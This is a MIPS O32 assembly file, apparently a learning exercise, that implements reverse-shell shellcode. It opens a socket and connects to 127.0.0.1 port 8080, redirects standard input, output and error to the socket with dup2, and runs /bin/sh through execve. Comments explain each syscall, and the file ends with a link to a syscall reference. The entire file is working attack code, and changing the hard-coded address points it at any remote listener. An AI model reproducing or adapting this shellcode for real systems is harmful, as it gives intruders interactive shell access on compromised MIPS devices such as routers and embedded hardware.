.globl main
.text
# MIPS assembly works in destination, source commands 


# socket(2, 2, 0) = sock_fd
# Load all the params into registers and intialize the syscall
li $a0, 2
li $a1, 2
li $a2, 0
li $v0, 0x1057
syscall
move $s0, $v0

# connect(3, {2, htons(0x1f90), inet_addr(0x7f000001)}, 16) 
move $a0, $s0
li $t0, 2
sh $t0, -20($sp) #sh (store) commands use source, destination 
li $t0, 0x901F
sh $t0, -18($sp)
li $t0, 0x007F
sh $t0, -16($sp)
li $t0, 0x0100
sh $t0, -14($sp)
addiu $a1, $sp, -20
li $a2, 16
li $v0, 0x104A
syscall

# dup2(3, 0)
move $a0, $s0
li $a1, 0
li $v0, 0xFDF
syscall

# dup2(3, 1)
move $a0, $s0
li $a1, 1
li $v0, 0xFDF
syscall

# dup2(3, 2)
move $a0, $s0
li $a1, 2
li $v0, 0xFDF
syscall

# execve("/bin/sh", ["/bin/sh"], NULL)
# "/"   "b"  "i" "n"  "/"  "s"  "h"
# 0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68
lui $t0, 0x6e69
addiu $t0, 0x622f
sw $t0, -20($sp)
lui $t0, 0x0068
addiu $t0, 0x732f
sw $t0, -16($sp)

addiu $a0, $sp, -20
sw $a0, -8($sp)
sw $zero, -4($sp)
addiu $a1, $sp, -8
li $a2, 0
li $v0, 0xFAB
syscall

# Website = https://syscalls.w3challs.com/?arch=mips_o32
